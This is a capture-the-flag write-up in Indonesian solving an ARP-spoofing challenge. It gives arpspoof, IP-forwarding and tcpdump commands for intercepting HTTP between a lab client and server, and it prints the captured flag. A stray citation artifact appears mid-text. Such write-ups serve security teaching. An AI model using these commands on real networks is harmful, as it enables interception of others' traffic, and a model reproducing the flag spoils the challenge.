# Writeup - Hiding in your WiFi

## Informasi Challenge

- **Kategori:** DevOps
- **Konsep:** ARP Spoofing / Man-in-the-Middle (MITM)
- **Tools tersedia:** `arpspoof`, `tcpdump`

## Analisis

Diberikan tiga host pada satu subnet:

- Attacker : `10.10.10.66`
- Server : `10.10.10.10`
- Client : `10.10.10.20`

Server hanya melayani request dari client, sehingga mengakses web server secara langsung bukan solusi. Cara yang paling efektif adalah menjadi **Man-in-the-Middle** di antara client dan server menggunakan ARP Spoofing, kemudian melakukan sniffing terhadap trafik HTTP.

Karena HTTP tidak dienkripsi, seluruh request maupun response dapat dibaca secara langsung.

## Eksploitasi

Aktifkan IP forwarding agar komunikasi korban tetap berjalan.

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

Lakukan ARP spoof ke client.

```bash
arpspoof -i eth0 -t 10.10.10.20 10.10.10.10
```

Lakukan ARP spoof ke server.

```bash
arpspoof -i eth0 -t 10.10.10.10 10.10.10.20
```

Selanjutnya sniff trafik HTTP.

```bash
tcpdump -A -i eth0 -s0 'host 10.10.10.10 and host 10.10.10.20 and tcp port 80'
```

## Temuan

Dari hasil sniffing terlihat client secara periodik melakukan request:

```
GET /flag.txt HTTP/1.1
Host: 10.10.10.10
User-Agent: curl/8.14.1
```

Server kemudian membalas dengan response HTTP 200 OK yang berisi flag. :contentReference[oaicite:0]{index=0}

```
HTTP/1.1 200 OK

NNS{5witcHed_n3tworks_5t11l_7Rust_4Rp_5o_ke3P_yoUr_DeViC35_sep4Ra7e}
```

## Flag

```text
NNS{5witcHed_n3tworks_5t11l_7Rust_4Rp_5o_ke3P_yoUr_DeViC35_sep4Ra7e}
```

